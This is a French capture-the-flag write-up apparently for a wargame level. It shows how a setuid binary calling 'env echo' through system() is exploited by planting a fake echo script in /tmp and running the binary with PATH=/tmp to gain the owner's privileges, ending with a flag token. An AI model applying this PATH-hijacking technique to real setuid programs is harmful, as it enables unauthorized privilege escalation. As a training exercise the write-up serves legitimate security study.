# level03

ls

Je vois un fichier level03 que je tente d'executer en faisant:

`./level03`

output: 
`Exploit me`

J'essaie de rajouter des arguments mais rien ne se passe.


`ls -la `

et je vois des droits spéciaux

```bash 
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
```

Je verifie et vois que le s signifie exec avec les droits du propriétaire ici level03
Je me dis qu'il serait interessant de le désassembler pour voir se qu'il en retourne:

Je regarde les différents désassembleur :

IDA Pro (Interactive DisAssembler) – très puissant, version gratuite disponible : IDA Free
Ghidra – développé par la NSA, gratuit et open source, très complet.
Radare2 / Cutter – open source, interface graphique disponible avec Cutter.
x64dbg – pour le debug/désassemblage sur Windows

Je choisis Ghidra qui m'a l'air tres fiable et facile d'utilisation
plus compliqué que prevu mais j'arrive enfin à decompiler le programme et j'obtiens:

```c
/* WARNING: Unknown calling convention */

int main(int argc,char **argv,char **envp)

{
  __gid_t __rgid;
  __uid_t __ruid;
  int iVar1;
  gid_t gid;
  uid_t uid;
  
  __rgid = getegid();
  __ruid = geteuid();
  setresgid(__rgid,__rgid,__rgid);
  setresuid(__ruid,__ruid,__ruid);
  iVar1 = system("/usr/bin/env echo Exploit me");
  return iVar1;
}
```

Je vois qu'ici le programme fait appel à son environnement(PATH) pour localiser et exécuté echo
C'est une faille car on peut modifier le PATH pour y insérer un éxecutable ou un script du même nom qui sera exécuté à la place du vrai echo 

`touch echo`

output:
```bash
touch: cannot touch `echo': Permission denied`
```

Il faut que je puisse crée mon script librement je cherche alors un endroit ou j'ai les droits je vois quand je fais un touch echo dans /tmp que ca fonctionne

Je cherche ou est l'executable getflag:
`find / -type f -name "getflag" -executable 2>/dev/null`

output:
```bash
/bin/getflag
/rofs/bin/getflag
```

script:
`/bin/getflag`

`chmod +x echo` Ajoute les droits pour executer le script

il ne me reste plus qu'à modfier le path

`env PATH=/tmp ./level03`

output:
`Check flag.Here is your token : qi0maab88jeaj46qoumi7maus`
